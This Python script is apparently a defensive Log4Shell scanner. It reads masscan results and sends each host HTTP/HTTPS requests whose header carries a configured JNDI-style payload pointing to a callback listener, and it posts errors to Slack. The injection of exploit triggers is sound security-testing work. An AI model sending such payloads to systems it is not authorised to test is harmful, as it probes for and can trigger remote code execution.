#!/usr/bin/env python3
import traceback
import aiohttp
import asyncio
import os
import requests
from urllib import parse
import configparser
import sys
import logging
from bibtutils.slack import message
from datetime import datetime, timedelta, date

def clean_logs():
    '''
    Cleans out all log files older than 7 days.
    '''
    for file in os.scandir(logdir):
        logdate = date.fromisoformat(file.name.split('.')[0])
        if date.today() - timedelta(days=7) > logdate:
            logging.info(f'Deleting log older than 7 days: {file.path}')
            os.remove(file.path)


async def request(session, host):
    '''
    Will try both an http and https GET from the specified host.
    '''
    logging.info(f'> {host}')
    payload_msg = f'[{host}] {os.environ["HEADER_FIELD"]}: {os.environ["PAYLOAD_PREFIX"]}'
    headers = {}
    headers[os.environ['HEADER_FIELD']] = os.environ['PAYLOAD_PREFIX']+f'{os.environ["LISTENER_IP"]}:{os.environ["LISTENER_PORT"]}/{parse.quote_plus(payload_msg)}'+'}'
    logging.debug(f'Request headers: {headers}')
    try:
        async with session.get(f'http://{host}', ssl=False, headers=headers) as resp:
            text = await resp.text()
            logging.info(f'-> Connection established on: http://{host}')
            # print(text)
    except:
        logging.error(f'x> Connection error on: http://{host}')
        pass
    try:
        async with session.get(f'https://{host}', ssl=False, headers=headers) as resp:
            text = await resp.text()
            logging.info(f'-> Connection established on: https://{host}')
            # print(text)
    except:
        logging.error(f'x> Connection error on: https://{host}')
        pass



async def main(data):
    '''
    Expects a list of ips in the format:
    [
        "10.200.0.10/",
        "10.200.0.196:8080/",
        "10.200.0.215:443/"
    ]
    '''
    # data.insert(0, "127.0.0.1:8080/")
    connector = aiohttp.TCPConnector(limit=os.environ['ASYNC_SESSION_LIMIT'])
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [request(session, record) for record in data]
        await asyncio.gather(*tasks)

try:
    logdir = '/var/log/log4shell-scan'
    if not os.path.exists(logdir):
        os.mkdir(logdir)
    logfile = f'{logdir}/{date.today().isoformat()}.log'
    logging.basicConfig(
        level=logging.DEBUG,
        filename=logfile
    )
    clean_logs()
    config = configparser.ConfigParser()
    config.read('/etc/log4shell-scan.ini')
    for key in config['default']:
        os.environ[key.upper()] = config['default'][key]
    
    logging.info(f'Writing logs to: {logfile}')
    input_file = '/tmp/masscan.txt'
    if os.path.exists(input_file):
        pass
    elif not os.path.exists(input_file) and os.path.exists('/tmp/masscan.tmp.txt'):
        input_file = '/tmp/masscan.tmp.txt'
    else:
        logging.critical(
            'No input file found! (/tmp/masscan.txt and '
            '/tmp/masscan.tmp.txt do not exist, ensure masscan '
            'has run or is running).'
        )
        raise FileNotFoundError(
            'No input file found! (/tmp/masscan.txt and '
            '/tmp/masscan.tmp.txt do not exist, ensure masscan '
            'has run or is running).'
        )
        
    with open(input_file, 'r') as infile:
        data = infile.read().split('\n')
    ndata = []
    for row in data:
        logging.debug(row)
        try:
            status, proto, port, ip, ts = row.split(' ')
        except ValueError:
            continue
        ndata.append(f'{ip}:{port}/')
    asyncio.run(main(ndata))
    logging.info(f'\nComplete, iterated over {len(ndata)} addresses.\n')
except Exception as e:
    logging.critical(f'Error on scan: {type(e).__name__}: {e}')
    exc_type, exc_value, exc_traceback = sys.exc_info()
    stacktrace = ''.join(traceback.format_exception(etype=exc_type, value=exc_value, tb=exc_traceback))
    logging.critical(stacktrace)
    try:
        if len(stacktrace) > 300:
            stacktrace = '...\n'+stacktrace[:-300]
        message.send_message(
            os.environ['WEBHOOK'], 
            title=':exclamation: *Critical Error on log4shell-scan Script* :exclamation: @mobrien',
            text=(
                f'```{type(e).__name__}: {e}```\n'
                f'```{stacktrace}```\n'
                '_Note: this only means the script failed for some reason, not that a vulnerability was detected._'
            ),
            color='#ffa500'
        )
    except Exception as f:
        logging.critical(f'Exception caught while handling exception: {type(f).__name__}: {f}')
        stacktrace = ''.join(traceback.format_exception(f))
        logging.critical(stacktrace)
    print(f'Exception caught, check logs for information: {logfile}')
    exit(1)
